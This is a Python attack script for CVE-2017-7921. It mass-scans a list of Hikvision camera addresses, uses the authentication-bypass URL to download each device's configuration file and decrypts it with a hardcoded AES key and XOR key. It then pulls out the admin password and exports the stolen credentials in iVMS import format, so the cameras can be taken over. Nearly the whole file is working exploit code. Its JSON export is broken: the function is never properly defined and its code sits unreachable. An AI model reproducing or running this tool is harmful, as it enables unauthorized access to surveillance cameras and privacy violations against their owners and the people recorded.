#!/usr/bin/python3
# @Maptnh@ CVE-2017-7921 Auto Crack password
import json
import argparse
from itertools import cycle
from Crypto.Cipher import AES
import re
import os
import sys
import requests
import xml.etree.ElementTree as ET
from requests.exceptions import RequestException
from requests.auth import HTTPBasicAuth
import threading
import queue


RED = "\033[31m"          
BRIGHT_RED = "\033[31;1m" 
RESET = "\033[0m"         


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


LOGO = '''                                  
            .------..------..------.
            |H.--. ||I.--. ||K.--. |
            | :/\: || (\/) || :/\: |
            | (__) || :\/: || :\/: |
            | '--'H|| '--'I|| '--'K|
            `------'`------'`------'                 
Maptnh@S-H4CK13  CVE-2017-7921 Auto Crack Hik Password
======================================================='''


NAMESPACE = {'hik': 'http://www.hikvision.com/ver20/XMLSchema'}

class HikvisionCracker:
    def __init__(self):
        self.URL_SUFFIX = "/System/configurationFile?auth=YWRtaW46MTEK"
        self.DEFAULT_USER = "admin"
        self.SDK_PORT = 8000 
        self.DEFAULT_RTSP_PORT = 554
    
        self.CSV_HEADER = (
            "Name,"
            "Adding Mode (0: IP/Domain; 1: HiDDNS; 2: ISUP),"
            "Address (Adding Mode 0: IP Address/Domain Name; Adding Mode 1: Server Address; Adding Mode 2: Invalid),"
            "Port,"
            "Device Information (Adding Mode 0: Invalid; Adding Mode 1: Domain Name; Adding Mode 2: Account),"
            "User Name,"
            "Password (Adding Mode 0/1: Password; Adding Mode 2: ISUP Key),"
            "Add Offline Device (0: No; 1: Yes),"
            "Export to Group (0: No; 1: Yes),"
            "Channel Number (Add Offline Device 0: Invalid; Add Offline Device 1: Range [1 to 32].),"
            "Alarm Input Number (Add Offline Device 0: Invalid; Add Offline Device 1: Range [1 to 32].),"
            "Transmission Encryption (TLS) (0: No; 1: Yes)"
        )
    
    def add_to_16(self, s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def decrypt(self, ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = self.add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def xore(self, data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def strings(self, file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    def read_ips_from_file(self, file_path):
        ip_list = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line:
                        continue
                    
                    if ':' in line:
                        ip, port_str = line.split(':', 1)
                        ip = ip.strip()
                        port_str = port_str.strip()
                        if port_str.isdigit():
                            port = int(port_str)
                            ip_list.append({"ip": ip, "port": port})
                        else:
                            port = 80
                            ip_list.append({"ip": ip, "port": port})
                            print(f"[!] Line {line_num}: Port '{port_str}' is not a valid number, using default port 80 for IP: {ip}")
                    else:
                        ip = line.strip()
                        port = 80
                        ip_list.append({"ip": ip, "port": port})
                        print(f"[!] Line {line_num}: Format error (not ip:port), using default port 80 for IP: {ip}")
            
            if not ip_list:
                print(f"[!] Warning: No valid IP:port entries read from {file_path}")
            else:
                print(f"[*] Successfully read {len(ip_list)} valid IP:port targets")
            return ip_list
        except FileNotFoundError:
            print(f"[!] Error: File {file_path} not found. Please verify the file path.")
            return []
        except Exception as e:
            print(f"[!] Error reading file: {str(e)}")
            return []

    def request_ip(self, ip, port=80):
        proto = "https" if port == 443 else "http"
        full_url = f"{proto}://{ip}:{port}{self.URL_SUFFIX}"
        try:
            response = requests.get(
                full_url, 
                timeout=1, 
                verify=False, 
                allow_redirects=False
            )  
            return response
        except RequestException as e:
            return None
    
    def find_last_list_index(self,lst, target):
        try:
            return len(lst) - 1 - lst[::-1].index(target)
        except ValueError:
            return -1

    def clean_csv_field(self, field):
        if not isinstance(field, str):
            field = str(field)
        field = field.replace(',', '&#44;') 
        field = field.replace('\n', '').replace('\r', '')  
        field = field.replace('\t', ' ')  
        field = field.strip()
        return field

    def crack_password(self, ip, port):
        response = self.request_ip(ip, port)
        if response is None:
            return None
        
        if response.status_code == 200:
            try:
                binary_data = response.content
                decrypt_data = self.decrypt(binary_data)
                xor_data = self.xore(decrypt_data)
                data = self.strings(xor_data.decode('ISO-8859-1', errors='ignore'))
                base_index = self.find_last_list_index(data, 'admin')
                
                if base_index != -1 and base_index + 1 < len(data):
                    username = data[base_index]
                    password = data[base_index+1]
                    password = password if password.strip() else "default123456"
                    
                    with threading.Lock():
                        print(f"[+] {ip}:{port} => [{BRIGHT_RED}{username}:{password}{RESET}] | SDK_PORT:{self.SDK_PORT}")
                
                    return {
                        "csv_data": {
                            "name": self.clean_csv_field(f"Cam_{ip.replace('.','_')}_{self.SDK_PORT}"),
                            "adding_mode": 0,
                            "address": self.clean_csv_field(ip),
                            "port": self.SDK_PORT,
                            "device_info": "",
                            "user_name": self.clean_csv_field(self.DEFAULT_USER),
                            "password": self.clean_csv_field(password),
                            "add_offline_device": 0,
                            "export_to_group": 0,
                            "channel_number": "",
                            "alarm_input_number": "",
                            "tls_encryption": 0
                        },
                        "json_data": {
                            "IP": ip,
                            "HTTP_PORT": port,
                            "RTSP_PORT": str(self.DEFAULT_RTSP_PORT), 
                            "PASSWORD": password 
                        }
                    }
            except Exception as e:
                return None
        else:
            with threading.Lock():
                print(f"{ip}:{port} SKIP....")
            return None

def worker(cracker_instance, task_queue, success_list, lock, print_lock):
    while not task_queue.empty():
        try:
            target = task_queue.get(timeout=1)
            ip = target['ip']
            port = target['port']
            result = cracker_instance.crack_password(ip, port)
            if result:
                with lock:
                    success_list.append(result)
            task_queue.task_done()
        except queue.Empty:
            break
        except Exception as e:
            with print_lock:
                print(f"[!] Thread error processing {ip}:{port} - {str(e)}")
            task_queue.task_done()

def save_to_ivms_csv(cracker, success_list, csv_path):
    dir_path = os.path.dirname(csv_path)
    if not os.path.exists(dir_path):
        os.makedirs(dir_path, exist_ok=True)
        print(f"[*] Created directory: {dir_path}")
    
    header_fields = cracker.CSV_HEADER.split(',')
    expected_fields_count = len(header_fields)
    print(f"[*] CSV header check: {expected_fields_count} fields required (12)")

    csv_rows = [cracker.CSV_HEADER + "\r\n"]
    
    valid_rows = 0
    for idx, device in enumerate(success_list):
        if not device or "csv_data" not in device:
            continue
        
        csv_data = device["csv_data"]
        row = (
            f"{csv_data['name']},"
            f"{csv_data['adding_mode']},"
            f"{csv_data['address']},"
            f"{csv_data['port']},"
            f"{csv_data['device_info']},"
            f"{csv_data['user_name']},"
            f"{csv_data['password']},"
            f"{csv_data['add_offline_device']},"
            f"{csv_data['export_to_group']},"
            f"{csv_data['channel_number']},"
            f"{csv_data['alarm_input_number']},"
            f"{csv_data['tls_encryption']}\r\n"
        )
        
        row_fields_count = len(row.strip().split(','))
        if row_fields_count != expected_fields_count:
            print(f"[!] Skip invalid row {idx}: {csv_data['address']} (fields count {row_fields_count} != {expected_fields_count})")
            continue
        
        csv_rows.append(row)
        valid_rows += 1
    
    try:
        with open(csv_path, 'w', encoding='utf-8', newline='') as f:
            f.writelines(csv_rows)
        
        if os.path.exists(csv_path):
            file_size = os.path.getsize(csv_path)
            print(f"[*] Successfully saved {valid_rows} valid devices to CSV: {csv_path} (Size: {file_size} bytes, Encoding: utf-8)")
        return True
    except Exception as e:
        print(f"[!] Failed to save CSV: {str(e)}")
        return False

    dir_path = os.path.dirname(json_path)
    if not os.path.exists(dir_path):
        os.makedirs(dir_path, exist_ok=True)
    
    json_output = []
    for device in success_list:
        if device and "json_data" in device:
            json_output.append(device["json_data"])
    
    try:
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_output, f, ensure_ascii=False, indent=4, separators=(',', ': '))
        print(f"[*] Successfully saved {len(json_output)} devices to JSON: {json_path}")
        return True
    except Exception as e:
        print(f"[!] Failed to save JSON: {str(e)}")
        return False

def main():
    print(LOGO)
    parser = argparse.ArgumentParser(description='CVE-2017-7921 Hikvision Password Cracker - New iVMS CSV Fields (English)')
    parser.add_argument('--ips', type=str, default="./target.txt", help='IP:PORT list file path (default: ./target.txt)')
    output_group = parser.add_mutually_exclusive_group(required=True)
    output_group.add_argument('--csv', type=str, help='Export to new iVMS CSV format (e.g., --csv ./hik_ivms_new.csv)')
    output_group.add_argument('--json', type=str, help='Export to specified JSON format (e.g., --json ./hik_result.json)')
    
    args = parser.parse_args()

 
    cracker = HikvisionCracker()
    success_list = []   
    result_lock = threading.Lock()
    print_lock = threading.Lock()   
    task_queue = queue.Queue()
 
    ip_list = cracker.read_ips_from_file(args.ips)
    if not ip_list:
        sys.exit(1)
    for target in ip_list:
        task_queue.put(target)
 
    print(f"[*] Starting batch cracking with 5 threads...")
    threads = []
    thread_count = 5  
    for i in range(thread_count):
        t = threading.Thread(target=worker, args=(cracker, task_queue, success_list, result_lock, print_lock))
        t.daemon = True 
        t.start()
        threads.append(t)
 
 
    task_queue.join()
    for t in threads:
        t.join()
    
 
    if args.csv:
        save_to_ivms_csv(cracker, success_list, args.csv)
        print(f"[*] Batch cracking completed! Total valid devices: {len(success_list)}")
        print(f"[*] Only CSV file generated: {args.csv} (utf-8 encoding)")
    elif args.json:
        save_to_json(success_list, args.json)
        print(f"[*] Batch cracking completed! Total valid devices: {len(success_list)}")
        print(f"[*] Only JSON file generated: {args.json}")

if __name__ == "__main__":
    main()
